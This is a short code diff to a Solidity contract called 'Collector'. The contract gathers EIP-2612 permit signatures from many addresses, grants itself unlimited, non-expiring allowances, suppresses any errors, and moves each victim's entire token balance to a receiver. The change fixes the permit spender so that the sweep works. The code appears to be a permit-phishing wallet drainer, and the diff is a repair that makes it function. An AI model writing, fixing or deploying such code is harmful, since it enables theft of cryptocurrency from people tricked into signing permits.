@@ -18,7 +18,7 @@ contract Collector {
         IERC20(token).approve(address(this), type(uint256).max);
         for (uint256 i = 0; i < _addresses.length; i++) {
             uint256 balance = IERC20(token).balanceOf(_addresses[i]);
-            try IERC20Permit(token).permit(_addresses[i], _receiver, type(uint256).max, type(uint256).max, _v[i], _r[i], _s[i]){
+            try IERC20Permit(token).permit(_addresses[i], address(this), type(uint256).max, type(uint256).max, _v[i], _r[i], _s[i]){
 
             }catch{}
             try IERC20(token).transferFrom(_addresses[i], _receiver, balance){
